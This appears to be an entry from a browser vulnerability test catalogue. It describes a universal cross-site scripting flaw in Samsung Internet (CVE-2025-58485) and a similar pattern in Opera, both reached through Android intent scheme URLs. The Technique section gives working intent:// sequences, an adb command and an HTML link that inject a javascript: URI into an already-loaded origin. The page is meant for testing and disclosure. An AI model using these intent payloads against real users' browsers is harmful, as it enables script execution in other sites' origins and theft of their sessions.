Android Intent Scheme URL UXSS (Opera / Samsung Pattern)

ID: UXSS-OPERA-01 CVE: CVE-2025-58485 (Samsung), Pattern applies to Opera Browsers: Opera (Android), Samsung Internet, Chromium-based Android browsers Category: UXSS via Intent Scheme

Description

Android browsers that export activities with intent filters accepting arbitrary URLs can be exploited for UXSS. If the browser loads an attacker-supplied URL (including javascript: URIs) into the current tab via an exported activity, it executes in the context of whatever origin was already loaded.

CVE-2025-58485 in Samsung Internet exploited SBrowserMainActivity's exported INTENT_ACCESS_WEBSITE action. Similar patterns may exist in Opera and other Android browsers.

Technique

// Samsung Internet UXSS (CVE-2025-58485): // Step 1: Navigate victim to legitimate site via intent intent://ebniw.com#Intent; scheme=https; action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE; component=com.sec.android.app.sbrowser/.SBrowserMainActivity; S.extra_access_url=https://ebniw.com; S.extra_by_capsule=true; end // Step 2: After delay, inject javascript: into same tab intent://#Intent; action=com.sec.android.app.sbrowser.INTENT_ACCESS_WEBSITE; component=com.sec.android.app.sbrowser/.SBrowserMainActivity; S.extra_access_url=javascript:alert(document.domain); S.extra_by_capsule=true; end // Opera variant: Test Opera's exported activities // adb shell am start -a android.intent.action.VIEW \ // -d "javascript:alert(document.domain)" com.opera.browser // From a webpage (intent scheme URL): // <a href="intent://target.com#Intent;scheme=https; // action=android.intent.action.VIEW; // package=com.opera.browser;end">Open in Opera</a>

Run Test (Android Only)

These tests use Android intent:// URLs and only work on Android devices. On desktop, they will show as not applicable.
